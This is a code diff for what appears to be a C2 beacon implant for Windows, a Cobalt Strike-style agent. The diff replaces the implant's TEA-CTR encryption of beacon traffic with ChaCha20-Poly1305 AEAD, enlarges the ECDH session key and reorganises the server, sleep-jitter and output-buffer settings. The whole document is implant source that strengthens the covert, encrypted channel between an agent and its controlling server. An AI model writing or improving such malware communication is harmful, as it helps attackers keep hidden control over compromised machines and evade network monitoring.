@@ -11,35 +11,163 @@
 #include "beacon_compatibility.h"
 
 // ---------------------------------------------------------------------------
-// TEA-CTR encryption — key derived per-session via ECDH, not hardcoded
+// Configuration
+// ---------------------------------------------------------------------------
+#define SERVER_IP        "127.0.0.1"
+#define SERVER_PORT      8080
+#define USER_AGENT       "Mozilla/5.0"
+
+#define OUTPUT_BUF_SIZE  (256 * 1024)
+#define HTTP_BUF_SIZE    (512 * 1024)
+#define CMD_BUF_SIZE     4096
+#define PATH_BUF_SIZE    512
+#define AGENT_ID_SIZE    256
+
+#define SLEEP_BASE_MS    5000
+#define SLEEP_JITTER_MS  3000
+
+// ---------------------------------------------------------------------------
+// Output buffer (unchanged)
+// ---------------------------------------------------------------------------
+static char *beacon_buf     = NULL;
+static int   beacon_buf_pos = 0;
+static int   beacon_buf_cap = 0;
+static char  cwd[MAX_PATH]  = {0};
+
+// ---------------------------------------------------------------------------
+// ChaCha20-Poly1305 AEAD encryption — key derived per-session via ECDH
+// Format: [12-byte nonce][ciphertext+16-byte auth tag]
 // ---------------------------------------------------------------------------
 
-static uint8_t SESSION_KEY[16] = {0};  // set once during registration
+static uint8_t SESSION_KEY[32] = {0};  // set once during registration (32 bytes for ChaCha20-Poly1305)
 
-#define TEA_DELTA 0x9e3779b9u
-static void tea_encrypt(uint32_t *v, const uint32_t *k) {
-    uint32_t sum = 0;
-    for (int i = 0; i < 32; i++) {
-        sum  += TEA_DELTA;
-        v[0] += ((v[1] << 4) + k[0]) ^ (v[1] + sum) ^ ((v[1] >> 5) + k[1]);
-        v[1] += ((v[0] << 4) + k[2]) ^ (v[0] + sum) ^ ((v[0] >> 5) + k[3]);
+// Encrypt plaintext with ChaCha20-Poly1305 using BCrypt
+// Returns: nonce || ciphertext || auth_tag (12 + len + 16 bytes)
+static uint8_t *chacha20poly1305_encrypt(const uint8_t *plaintext, size_t plain_len,
+                                          size_t *out_len) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    uint8_t *nonce = NULL;
+    uint8_t *result = NULL;
+    
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
+        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed\n");
+        goto cleanup;
     }
+
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, SESSION_KEY, 32, 0))) {
+        fprintf(stderr, "[!] BCryptGenerateSymmetricKey failed\n");
+        goto cleanup;
+    }
+
+    // Allocate nonce (12 bytes) + ciphertext (plain_len) + auth tag (16 bytes)
+    nonce = (uint8_t *)malloc(12);
+    if (!nonce) goto cleanup;
+    gen_random_bytes(nonce, 12);
+
+    // Output buffer: nonce (12) + ciphertext (plain_len) + tag (16)
+    size_t ciphertext_len = plain_len;
+    size_t tag_len = 16;
+    *out_len = 12 + ciphertext_len + tag_len;
+    result = (uint8_t *)malloc(*out_len);
+    if (!result) goto cleanup;
+
+    // Copy nonce to output
+    memcpy(result, nonce, 12);
+
+    // BCrypt ChaCha20-Poly1305 encryption
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
+    authInfo.cbSize = sizeof(authInfo);
+    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
+    authInfo.pbAuthData = NULL;
+    authInfo.cbAuthData = 0;
+    authInfo.pbTag = result + 12 + ciphertext_len;  // Auth tag after ciphertext
+    authInfo.cbTag = tag_len;
+    authInfo.pbIV = nonce;
+    authInfo.cbIV = 12;
+
+    ULONG bytes_written = 0;
+    NTSTATUS status = BCryptEncrypt(hKey, (PUCHAR)plaintext, (ULONG)plain_len,
+                                    &authInfo,
+                                    NULL, 0,
+                                    result + 12, (ULONG)ciphertext_len,
+                                    &bytes_written, 0);
+    if (!BCRYPT_SUCCESS(status)) {
+        fprintf(stderr, "[!] BCryptEncrypt failed: 0x%08lX\n", (unsigned long)status);
+        free(result);
+        result = NULL;
+        goto cleanup;
+    }
+
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    free(nonce);
+    return result;
 }
 
-static void tea_ctr_xor(const uint8_t *key, uint64_t nonce, uint64_t counter,
-                         const uint8_t *in, uint8_t *out, size_t len) {
-    uint32_t k[4];
-    memcpy(k, key, 16);
-    uint64_t ctr = nonce + counter;
-    for (size_t off = 0; off < len; off += 8) {
-        uint8_t stream[8];
-        memcpy(stream, &ctr, 8);
-        tea_encrypt((uint32_t *)stream, k);
-        ctr++;
-        size_t rem = len - off;
-        for (size_t i = 0; i < rem && i < 8; i++)
-            out[off + i] = in[off + i] ^ stream[i];
+// Decrypt ciphertext with ChaCha20-Poly1305 using BCrypt
+// Input: nonce || ciphertext || auth_tag
+// Returns: plaintext (or NULL on failure)
+static uint8_t *chacha20poly1305_decrypt(const uint8_t *encrypted, size_t enc_len,
+                                          size_t *out_len) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    uint8_t *result = NULL;
+    
+    *out_len = 0;
+    if (enc_len < 12 + 16) {
+        fprintf(stderr, "[!] Encrypted data too short\n");
+        return NULL;
     }
+
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
+        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed\n");
+        goto cleanup;
+    }
+
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, SESSION_KEY, 32, 0))) {
+        fprintf(stderr, "[!] BCryptGenerateSymmetricKey failed\n");
+        goto cleanup;
+    }
+
+    uint8_t *nonce = (uint8_t *)encrypted;
+    const uint8_t *ciphertext = encrypted + 12;
+    size_t cipher_len = enc_len - 12 - 16;
+    const uint8_t *tag = encrypted + 12 + cipher_len;
+
+    result = (uint8_t *)malloc(cipher_len + 1);
+    if (!result) goto cleanup;
+
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
+    authInfo.cbSize = sizeof(authInfo);
+    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
+    authInfo.pbAuthData = NULL;
+    authInfo.cbAuthData = 0;
+    authInfo.pbTag = (PUCHAR)tag;
+    authInfo.cbTag = 16;
+    authInfo.pbIV = nonce;
+    authInfo.cbIV = 12;
+
+    ULONG bytes_written = 0;
+    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)cipher_len,
+                                    &authInfo,
+                                    NULL, 0,
+                                    result, (ULONG)cipher_len,
+                                    &bytes_written, 0);
+    if (!BCRYPT_SUCCESS(status)) {
+        fprintf(stderr, "[!] BCryptDecrypt failed: 0x%08lX\n", (unsigned long)status);
+        free(result);
+        return NULL;
+    }
+
+    result[cipher_len] = '\0';
+    *out_len = cipher_len;
+
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return result;
 }
 
 // ---------------------------------------------------------------------------
@@ -166,7 +294,7 @@ cleanup:
     return result;
 }
 
-// Perform ECDH and derive SESSION_KEY = SHA-256(raw_shared_secret)[:16].
+// Perform ECDH and derive SESSION_KEY = SHA-256(raw_shared_secret)[:32].
 // Destroys hPrivKey and hPeerPub when done regardless of outcome.
 static int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub) {
     BCRYPT_SECRET_HANDLE hSecret = NULL;
@@ -201,10 +329,10 @@ static int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPee
       raw[raw_len - 1 - i] = tmp;
     }
 
-    // KDF: SESSION_KEY = SHA-256(shared_secret)[:16]
+    // KDF: SESSION_KEY = SHA-256(shared_secret)[:32] for ChaCha20-Poly1305
     uint8_t hash[32];
     if (bcrypt_sha256(raw, raw_len, hash) == 0) {
-        memcpy(SESSION_KEY, hash, 16);
+        memcpy(SESSION_KEY, hash, 32);  // use all 32 bytes
         SecureZeroMemory(hash, 32);
         result = 0;
     }
@@ -218,29 +346,6 @@ cleanup:
     return result;
 }
 
-// ---------------------------------------------------------------------------
-// Configuration
-// ---------------------------------------------------------------------------
-#define SERVER_IP        "127.0.0.1"
-#define SERVER_PORT      8080
-#define USER_AGENT       "Mozilla/5.0"
-
-#define OUTPUT_BUF_SIZE  (256 * 1024)
-#define HTTP_BUF_SIZE    (512 * 1024)
-#define CMD_BUF_SIZE     4096
-#define PATH_BUF_SIZE    512
-#define AGENT_ID_SIZE    256
-
-#define SLEEP_BASE_MS    5000
-#define SLEEP_JITTER_MS  3000
-
-// ---------------------------------------------------------------------------
-// Output buffer (unchanged)
-// ---------------------------------------------------------------------------
-static char *beacon_buf     = NULL;
-static int   beacon_buf_pos = 0;
-static int   beacon_buf_cap = 0;
-static char  cwd[MAX_PATH]  = {0};
 
 static void buf_append(const char *data, int len) {
     if (!beacon_buf) return;
@@ -337,8 +442,8 @@ cleanup:
 }
 
 // ---------------------------------------------------------------------------
-// Encrypted HTTP POST — TEA-CTR, used for all traffic after key exchange
-// (identical to original except uses SESSION_KEY instead of hardcoded ENC_KEY)
+// Encrypted HTTP POST — ChaCha20-Poly1305 AEAD, used for all traffic after key exchange
+// Format: [12-byte nonce][ciphertext + 16-byte auth tag]
 // ---------------------------------------------------------------------------
 static int http_post_encrypted(const char *host, int port, const char *path,
                                 const uint8_t *plain_data, int plain_len,
@@ -349,19 +454,14 @@ static int http_post_encrypted(const char *host, int port, const char *path,
     uint8_t *enc_body  = NULL;
     uint8_t *resp      = NULL;
     int      total     = 0, bytes, ret = -1;
+    size_t   enc_len   = 0;
 
     *out_plain     = NULL;
     *out_plain_len = 0;
 
-    // Encrypt: [8-byte nonce][TEA-CTR ciphertext]
-    uint8_t nonce[8];
-    gen_random_bytes(nonce, 8);
-    int enc_len = plain_len + 8;
-    enc_body = (uint8_t *)malloc(enc_len);
+    // Encrypt plaintext with ChaCha20-Poly1305: returns [nonce||ciphertext||tag]
+    enc_body = chacha20poly1305_encrypt(plain_data, plain_len, &enc_len);
     if (!enc_body) goto cleanup;
-    memcpy(enc_body, nonce, 8);
-    if (plain_len > 0)
-        tea_ctr_xor(SESSION_KEY, *(uint64_t *)nonce, 0, plain_data, enc_body + 8, plain_len);
 
     // Connect
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -376,12 +476,12 @@ static int http_post_encrypted(const char *host, int port, const char *path,
         "Host: %s:%d\r\n"
         "User-Agent: %s\r\n"
         "Content-Type: application/octet-stream\r\n"
-        "Content-Length: %d\r\n"
+        "Content-Length: %zu\r\n"
         "Connection: close\r\n\r\n",
         path, host, port, USER_AGENT, enc_len);
 
     if (send(sockfd, hdr,                (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
-    if (send(sockfd, (const char *)enc_body, enc_len,      0) == SOCKET_ERROR) goto cleanup;
+    if (send(sockfd, (const char *)enc_body, (int)enc_len,    0) == SOCKET_ERROR) goto cleanup;
 
     resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
     if (!resp) goto cleanup;
@@ -397,18 +497,15 @@ static int http_post_encrypted(const char *host, int port, const char *path,
     if (!body) goto cleanup;
     body += 4;
     int body_len = total - (int)(body - (char *)resp);
-    if (body_len < 8) goto cleanup;
+    if (body_len < 12 + 16) goto cleanup;  // minimum: nonce (12) + tag (16)
 
-    uint64_t resp_nonce = *(uint64_t *)body;
-    int      cipher_len = body_len - 8;
-    uint8_t *plain      = (uint8_t *)malloc(cipher_len + 1);
+    // Decrypt response using ChaCha20-Poly1305
+    size_t decrypted_len = 0;
+    uint8_t *plain = chacha20poly1305_decrypt((uint8_t *)body, body_len, &decrypted_len);
     if (!plain) goto cleanup;
-    if (cipher_len > 0)
-        tea_ctr_xor(SESSION_KEY, resp_nonce, 0, (uint8_t *)body + 8, plain, cipher_len);
-    plain[cipher_len] = '\0';
 
     *out_plain     = plain;
-    *out_plain_len = cipher_len;
+    *out_plain_len = (int)decrypted_len;
     ret = 0;
 
 cleanup:
@@ -424,8 +521,8 @@ cleanup:
 // 1. Generate ephemeral P-256 keypair
 // 2. POST our pubkey (65 bytes X9.62) to /register  — plaintext
 // 3. Server responds: server pubkey (65 bytes) + agent UUID (36 bytes)
-// 4. Derive SESSION_KEY = SHA-256(ECDH shared secret)[:16]
-// 5. All subsequent requests use TEA-CTR with SESSION_KEY
+// 4. Derive SESSION_KEY = SHA-256(ECDH shared secret)[:32]
+// 5. All subsequent requests use ChaCha20-Poly1305 AEAD with SESSION_KEY
 // ---------------------------------------------------------------------------
 static int do_register(char agent_id[AGENT_ID_SIZE]) {
     BCRYPT_KEY_HANDLE hPriv    = NULL;
